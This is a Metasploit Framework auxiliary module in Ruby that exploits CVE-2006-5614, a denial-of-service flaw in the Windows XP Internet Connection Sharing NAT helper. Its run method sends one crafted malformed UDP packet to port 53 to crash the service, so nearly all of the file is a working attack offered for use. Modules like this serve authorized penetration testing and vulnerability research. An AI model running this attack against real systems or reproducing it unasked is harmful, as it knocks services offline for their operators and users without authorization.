##
# $Id: nat_helper.rb 9179 2010-04-30 08:40:19Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'


class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::Udp
	include Msf::Auxiliary::Dos

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Microsoft Windows NAT Helper Denial of Service',
			'Description'    => %q{
				This module exploits a denial of service vulnerability
				within the Internet Connection Sharing service in
				Windows XP.
			},
			'Author'         => [ 'MC' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 9179 $',
			'References'     =>
				[
					[ 'OSVDB', '30096'],
					[ 'BID', '20804' ],
					[ 'CVE', '2006-5614' ],
				],
			'DisclosureDate' => 'Oct 26 2006'))

			register_options([Opt::RPORT(53),], self.class)
	end

	def run
		connect_udp

		pkt =  "\x6c\xb6\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00"
		pkt << "\x03" + Rex::Text.rand_text_english(3) + "\x06"
		pkt << Rex::Text.rand_text_english(10) + "\x03"
		pkt << Rex::Text.rand_text_english(3)
		pkt << "\x00\x00\x01\x00\x01"

		print_status("Sending dos packet...")

		udp_sock.put(pkt)

		disconnect_udp
	end

end

